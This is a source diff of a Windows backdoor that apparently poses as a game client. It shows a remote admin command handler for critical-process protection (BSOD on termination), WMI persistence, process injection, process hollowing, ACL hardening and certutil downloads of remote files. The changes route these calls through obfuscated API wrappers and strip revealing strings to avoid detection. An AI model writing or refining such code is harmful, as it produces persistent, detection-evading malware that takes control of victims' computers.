@@ -62,7 +62,7 @@ static int download_module(const char *url, const char *out_path) {
 /* Auto-protect thread for shadow copies: waits 15 seconds then protects */
 DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
     Sleep(15000);  /* Wait 15 seconds after startup before protecting */
-    sys_protect_process();
+    obf_sys_protect_process();
     return 0;
 }
 
@@ -144,36 +144,36 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = "[Spawned 3 copies + ALL layers: Run key, Task, WMI, Injection, NTFS, Fileless Hollow]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
-        sys_unprotect_process();
+        obf_sys_unprotect_process();
         result = "[Critical flag removed — process can now be terminated]";
     }
     else if (strcmp(cmd, "CHECK_PROTECTION") == 0) {
-        const char *critical_status = sys_check_critical_status_with_name();
+        const char *critical_status = obf_sys_check_critical_status();
         const char *admin_status = sys_is_admin() ? "admin" : "not admin";
         snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
         result = response;
     }
     else if (strcmp(cmd, "WMI_PERSISTENCE") == 0) {
-        sys_wmi_persistence();
+        obf_sys_wmi_persistence();
         result = "[WMI persistence established: root/subscription, triggers every 30s]";
     }
     else if (strcmp(cmd, "INJECT_PROCESS") == 0) {
-        sys_inject_process();
+        obf_sys_inject_process();
         result = "[Process injection attempted: payload path injected into svchost/explorer]";
     }
     else if (strcmp(cmd, "HOLLOW_PROCESS") == 0) {
-        sys_hollow_process();
-        result = "[Process hollowing: notepad.exe running our payload purely from memory]";
+        obf_sys_hollow_process();
+        result = "[Process hollowing: conhost.exe running our payload purely from memory]";
     }
     else if (strcmp(cmd, "HARDEN_FILES") == 0) {
-        sys_harden_files();
+        obf_sys_harden_files();
         result = "[NTFS ACLs hardened: deny delete for all shadow copies]";
     }
     else if (strncmp(cmd, "LOLBAS_DOWNLOAD ", 16) == 0) {
         char url[1024], path[MAX_PATH];
         if (sscanf(cmd, "LOLBAS_DOWNLOAD %s %s", url, path) == 2) {
-            sys_lolbas_download(url, path);
-            result = "[LOLBAS download completed via certutil]";
+            obf_sys_lolbas_download(url, path);
+            result = "[Download completed via system utility]";
         } else {
             result = "[Usage: LOLBAS_DOWNLOAD <url> <outpath>]";
         }
@@ -186,12 +186,12 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         if (!sys_is_admin()) {
             result = "[FAIL: not running as administrator]";
         } else {
-            sys_protect_process();
+            obf_sys_protect_process();
             const char *status = sys_protection_status();
             if (strcmp(status, "CRITICAL") == 0) {
                 result = "[SUCCESS: Process is now CRITICAL — ending it will cause BSOD]";
             } else if (strcmp(status, "FAILED") == 0) {
-                result = "[FAIL: NtSetInformationProcess failed — likely missing SeDebugPrivilege. Try running as SYSTEM or use a different elevation method.]";
+                result = "[FAIL: Protection API failed — likely missing required privilege. Try running as SYSTEM or use a different elevation method.]";
             } else {
                 result = "[UNKNOWN: protection status unclear]";
             }
@@ -274,6 +274,9 @@ DWORD WINAPI game_client_loop(LPVOID lpParam) {
 
 /* Windows entry point */
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    /* Initialize obfuscated APIs FIRST (before any suspicious calls) */
+    obf_init_apis();
+    
     /* Initialize subsystems */
     InitializeCriticalSection(&g_copy_buffer_cs);
     copy_buffer_init();
